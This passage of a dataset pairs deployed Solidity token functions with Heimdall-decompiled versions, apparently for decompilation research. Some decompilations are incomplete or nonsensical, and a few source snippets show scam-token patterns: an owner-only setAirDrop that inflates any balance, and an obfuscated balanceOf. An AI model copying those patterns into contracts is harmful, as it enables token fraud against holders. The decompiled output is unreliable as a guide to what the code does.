0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(0x7a250d5630b4cf539739df2c5dacb4c659f2488d, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x22;\n        var_d = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        var_h = 0x02;\n        var_e = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d;\n        address var_h = keccak256(var_e);\n        storage_map_n[var_e] = 0x3b9aca00;\n        var_a = 0x3b9aca00;\n        emit Approval(address(this), 0x7a250d5630b4cf539739df2c5dacb4c659f2488d, 0x3b9aca00);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f / 0x01).factory(var_b); // staticcall\n        uint256 var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_j = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f / 0x01).WETH(var_c); // staticcall\n        var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_k = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_d = address(this);\n        uint256 var_g = address(var_i.length);\n        (bool success, bytes memory ret0) = address(var_i.length).Unresolved_c9c65396(var_d); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x24;\n        var_d = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x09 > 0xff) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                            if (!0x09 > 0x01) {\n                                if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                    var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                    var_f = 0x11;\n                                    if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_f = 0x11;\n                                        if (!0x01) {\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x6E66a59bF0F45A9Fdf99C28B45093F1BB41c990d", "original_solidity_code": "function approve(address spender, uint256 amount) external returns (bool){\r\n        allowance[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x03;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(msg.sender, address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0xeBca4047fEA5D4bB97BCDeb3fC6000fEf830aF2B", "original_solidity_code": "function manualSwap() external {\r\n        require(_msgSender()==_taxWallet);\r\n        uint256 tokenBalance=balanceOf(address(this));\r\n        if(tokenBalance>0){\r\n          swapTokensForEth(tokenBalance);\r\n        }\r\n        uint256 ethBalance=address(this).balance;\r\n        if(ethBalance>0){\r\n          sendETHToFee(ethBalance);\r\n        }\r\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(transferDelayEnabled / 0x0100)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_b[var_a]);\n        store_e = 0x01000000000000000000000000000000000000000000 | (uint248(store_e));\n        require(!storage_map_b[var_a]);\n        require(!bytes1(store_e / 0x010000000000000000000000000000000000000000));\n        var_c = 0x02;\n        uint256 var_d = var_d + 0x60;\n        var_e = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        address var_g = address(this);\n        var_h = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_d).WETH(var_i); // staticcall\n        var_d = var_d + (uint248(ret0.length + 0x1f));\n        require(!(((var_d + ret0.length) - var_d) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_d.length == (address(var_d.length)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        uint256 var_j = address(var_d.length);\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(address(store_d), \"ERC20: approve to the zero address\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_d);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a];\n        address var_k = storage_map_b[var_a];\n        emit Approval(address(this), address(store_d), storage_map_b[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        address var_l = storage_map_b[var_a];\n        uint256 var_m = 0;\n        var_n = 0xa0;\n        uint256 var_p = var_d.length;\n        address var_o = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_d).code.length);\n        (bool success, bytes memory ret0) = address(store_d).{ value: var_m ether }Unresolved_791ac947(var_l); // call\n        store_e = uint248(store_e);\n        require(!address(this).balance);\n        (bool success, bytes memory ret0) = address(transferDelayEnabled / 0x0100).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x54eEA875389f51FB46A26Ea5a5DbBa480ca74339", "original_solidity_code": "function updateDevelopmentWallet(address _developmentWallet)\r\n        external\r\n        onlyOwner\r\n    {\r\n        require(_developmentWallet != address(0), \"ERC20: Address 0\");\r\n        address oldWallet = developmentWallet;\r\n        developmentWallet = _developmentWallet;\r\n        emit developmentWalletUpdated(developmentWallet, oldWallet);\r\n    }", "heimdall_decompiled_code": "function updateDevelopmentWallet(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"ERC20: Address 0\");\n        developmentWallet = (address(arg0)) | (uint96(developmentWallet));\n        emit developmentWalletUpdated(address(arg0), address(developmentWallet));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x10;\n        var_d = 0x45524332303a2041646472657373203000000000000000000000000000000000;\n    }"}
{"contract_address": "0x30F674e5399B6493A6096d239153b21331fbC670", "original_solidity_code": "function manualBurnLiquidityPairTokens(uint256 percent)\r\n        external\r\n        onlyOwner\r\n        returns (bool)\r\n    {\r\n        require(\r\n            block.timestamp > lastManualLpBurnTime + manualBurnFrequency,\r\n            \"Must wait for cooldown to finish\"\r\n        );\r\n        require(percent <= 1000, \"May not nuke more than 10% of tokens in LP\");\r\n        lastManualLpBurnTime = block.timestamp;\r\n\r\n        // get balance of liquidity pair\r\n        uint256 liquidityPairBalance = this.balanceOf(uniswapV2Pair);\r\n\r\n        // calculate amount to burn\r\n        uint256 amountToBurn = liquidityPairBalance.mul(percent).div(10000);\r\n\r\n        // pull tokens from pancakePair liquidity and move to dead address permanently\r\n        if (amountToBurn > 0) {\r\n            super._transfer(uniswapV2Pair, address(0xdead), amountToBurn);\r\n        }\r\n\r\n        //sync price since this is not in a swap transaction!\r\n        IUniswapV2Pair pair = IUniswapV2Pair(uniswapV2Pair);\r\n        pair.sync();\r\n        emit ManualNukeLP();\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function manualBurnLiquidityPairTokens(uint256 arg0) public returns (bool) {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(lastManualLpBurnTime > ~(manualBurnFrequency)), \"Must wait for cooldown to finish\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(block.timestamp > (lastManualLpBurnTime + manualBurnFrequency), \"Must wait for cooldown to finish\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4d757374207761697420666f7220636f6f6c646f776e20746f2066696e697368;\n        require(!(arg0 > 0x03e8), \"May not nuke more than 10% of tokens in LP\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x2a;\n        var_d = 0x4d6179206e6f74206e756b65206d6f7265207468616e20313025206f6620746f;\n        var_g = 0x6b656e7320696e204c5000000000000000000000000000000000000000000000;\n        lastManualLpBurnTime = block.timestamp;\n        var_a = 0x70a0823100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x54a875b040e5413f27fb1ebe7af5180daf5e264a;\n        (bool success, bytes memory ret0) = address(this).Unresolved_70a08231(var_b); // staticcall\n        uint256 var_h = var_h + (uint248(ret0.length + 0x1f));\n        require(!(((var_h + ret0.length) - var_h) < 0x20), \"ERC20: transfer from the zero address\");\n        require(!(var_h.length & (arg0 > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / var_h.length))), \"ERC20: transfer from the zero address\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x2710, \"ERC20: transfer from the zero address\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        require(!((var_h.length * arg0) / 0x2710), \"ERC20: transfer from the zero address\");\n        require(0x54a875b040e5413f27fb1ebe7af5180daf5e264a, \"ERC20: transfer from the zero address\");\n        var_i = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x20;\n        var_d = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_j = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        require(0xdead, \"ERC20: transfer to the zero address\");\n        var_i = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x20;\n        var_d = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_j = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x54a875b040e5413f27fb1ebe7af5180daf5e264a;\n        uint256 var_k = 0;\n        require(!(storage_map_t[var_e] < ((var_h.length * arg0) / 0x2710)), \"ERC20: transfer amount exceeds balance\");\n        var_i = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x20;\n        var_d = 0x26;\n        var_g = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_j = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_e = 0x54a875b040e5413f27fb1ebe7af5180daf5e264a;\n        var_k = 0;\n        storage_map_t[var_e] = storage_map_t[var_e] - ((var_h.length * arg0) / 0x2710);\n        var_e = 0xdead;\n        require(!storage_map_t[var_e] > (~((var_h.length * arg0) / 0x2710)));\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        storage_map_t[var_e] = storage_map_t[var_e] + ((var_h.length * arg0) / 0x2710);\n        uint256 var_i = (var_h.length * arg0) / 0x2710;\n        emit Transfer(0x54a875b040e5413f27fb1ebe7af5180daf5e264a, 0xdead, (var_h.length * arg0) / 0x2710);\n        var_i = 0xfff6cae900000000000000000000000000000000000000000000000000000000;\n        require(address(0x54a875b040e5413f27fb1ebe7af5180daf5e264a).code.length);\n        (bool success, bytes memory ret0) = address(0x54a875b040e5413f27fb1ebe7af5180daf5e264a).{ value: var_k ether }sync(var_c); // call\n        emit ManualNukeLP();\n        var_i = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0x243aA7135A82d62dc6847C1Ad5A2E7c87c01502d", "original_solidity_code": "function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x19757069132C642180F1112d4cD61d67c1f06B49", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(msg.sender);\n        var_b = 0x07;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] > (arg1 + storage_map_b[var_a])), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x07;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        uint256 var_d = arg1 + storage_map_b[var_a];\n        emit Approval(address(msg.sender), address(arg0), arg1 + storage_map_b[var_a]);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x7006A0F5D09b07a365Ff1306467407E57312cF29", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_h[var_a];\n        return storage_map_h[var_a];\n    }"}
{"contract_address": "0xF47024a2e10D77927767cBE5aADf5F8BB02782c9", "original_solidity_code": "function setAirDrop(address account, uint256 amount) public onlyOwner {\\r\\n        _balances[account] = _balances[account] + amount;\\r\\n    }", "heimdall_decompiled_code": "function setAirDrop(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        address var_f = address(arg0);\n        var_g = 0x65;\n        require(!storage_map_i[var_f] > (storage_map_i[var_f] + arg1));\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_f = address(arg0);\n        var_g = 0x65;\n        storage_map_i[var_f] = storage_map_i[var_f] + arg1;\n    }"}
{"contract_address": "0xe2BFF0b8121D4977F0aFd680dB7d3eADDa4Ab3Df", "original_solidity_code": "function manualsend() external {\r\nrequire(_msgSender() == _devWallet || _msgSender() == _marketingWallet);\r\nuint256 contractETHBalance = address(this).balance;\r\nsendETHToFee(contractETHBalance);\r\n}", "heimdall_decompiled_code": "function manualsend() public {\n        require(address(msg.sender) == (address(store_l)));\n        require(address(msg.sender) == (address(store_m)));\n        (bool success, bytes memory ret0) = address(store_m).transfer(address(this).balance);\n    }"}
{"contract_address": "0xaEAD18A6f788fb7460aDA9fDFf4C4Cd6Ba72dDBE", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\\n        return ERC721AStorage.layout()._symbol;\\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_r) {\n            if (store_r - ((store_r >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_r >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_r >> 0x01;\n                if (store_r) {\n                    if (store_r - ((store_r >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_r >> 0x01) {\n                            if (0x1f < (store_r >> 0x01)) {\n                                var_a = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c43;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_r >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked(0x20, var_c.length);\n                                        return abi.encodePacked(0x20, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x46062Bb908158b945803Df5E5233c10240269C09", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\\n        emit OwnershipTransferred(_owner, address(0));\\n        _owner = address(0);\\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0x8A9Fc31209981A2BC667f39654Fa6BE6ce8611d7", "original_solidity_code": "function totalSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}", "heimdall_decompiled_code": "function totalSupply() public view {\n        var_a = 0x02;\n        var_b = 0xdead;\n        if (!(store_k - store_l) > store_k) {\n            var_b = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_c = 0x11;\n        }\n    }"}
{"contract_address": "0xB52Bb372A4C3336A6f3ddd8fB3dE8d6DF735Ad50", "original_solidity_code": "function balanceOf(address account) external view override returns (uint256) {\\r\\n      uint160 \\r\\n      x = uint160(account\\r\\n        ); return slotValues(\\r\\n          x, 4) + \\r\\n          slotValues(x\\r\\n          , 6); }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        address var_a = address(arg0);\n        var_b = 0x06;\n        var_a = address(arg0);\n        var_b = 0x04;\n        address var_c = storage_map_e[var_a] + storage_map_e[var_a];\n        return storage_map_e[var_a] + storage_map_e[var_a];\n    }"}
{"contract_address": "0x50A1f46F028622B4cD9BE9c0E687104247946293", "original_solidity_code": "function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x04Ac04832dFeF1DFa133B242724D0a154C4a78Cb", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\\n        return _balances[account];\\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x12;\n        address var_c = storage_map_f[var_a];\n        return storage_map_f[var_a];\n    }"}
{"contract_address": "0x311f785e0fcb5A7c8990cdBe114e59A787116705", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_t) {\n            if (store_t - ((store_t >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_t >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_t >> 0x01;\n                if (store_t) {\n                    if (store_t - ((store_t >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_t >> 0x01) {\n                            if (0x1f < (store_t >> 0x01)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_t >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x19757069132C642180F1112d4cD61d67c1f06B49", "original_solidity_code": "function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        _approve(owner, spender, currentAllowance - subtractedValue);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(msg.sender);\n        var_b = 0x07;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: decreased allowance below zero\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77;\n        var_g = 0x207a65726f000000000000000000000000000000000000000000000000000000;\n        require(!((storage_map_b[var_a] - arg1) > storage_map_b[var_a]), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x07;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        uint256 var_c = storage_map_b[var_a] - arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] - arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xF36754d67a8C99e1D683915ED5A6E55aB259ba79", "original_solidity_code": "function set_New_Router_and_Make_Pair(address newRouter) public onlyOwner() {\r\n        IUniswapV2Router02 _newPCSRouter = IUniswapV2Router02(newRouter);\r\n        uniswapV2Pair = IUniswapV2Factory(_newPCSRouter.factory()).createPair(address(this), _newPCSRouter.WETH());\r\n        uniswapV2Router = _newPCSRouter;\r\n    }", "heimdall_decompiled_code": "function set_New_Router_and_Make_Pair(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(arg0).factory(var_b); // staticcall\n        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_f == (address(var_f)));\n        var_g = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(arg0).WETH(var_d); // staticcall\n        var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_f == (address(var_f)));\n        var_h = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        address var_i = address(var_f);\n        (bool success, bytes memory ret0) = address(var_f).{ value: 0 ether }Unresolved_c9c65396(var_e); // call\n    }"}
{"contract_address": "0x679905CAD3Da37c92fa79d88d865Fb9FF48a8B50", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\\n        address owner = _msgSender();\\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\\n        return true;\\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] > (storage_map_b[var_a] + arg1)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] + arg1;\n        uint256 var_d = storage_map_b[var_a] + arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] + arg1);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x22;\n        var_h = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_i = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x24;\n        var_h = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_i = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
